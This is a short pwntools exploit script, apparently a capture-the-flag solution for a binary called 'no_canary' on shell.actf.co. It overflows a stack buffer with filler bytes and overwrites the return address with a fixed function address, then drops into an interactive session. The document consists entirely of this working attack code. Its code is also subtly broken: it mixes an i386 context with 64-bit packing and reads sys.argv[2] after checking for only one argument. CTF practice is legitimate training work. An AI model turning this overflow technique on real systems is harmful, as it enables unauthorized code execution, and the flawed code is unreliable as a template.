from pwn import *

context(os="linux", arch="i386")
context.log_level = "debug"

HOST = "shell.actf.co"
PORT = 20700
conn = None

if len(sys.argv) > 1 and sys.argv[2] == "r":
    conn = remote(HOST, PORT)
else:
    conn = process("./no_canary")

payload=b'B'*20
payload+=b'A'*4
payload+=p64(0x0000000000401186)

conn.recvuntil("name?")
conn.sendline(payload)
conn.interactive()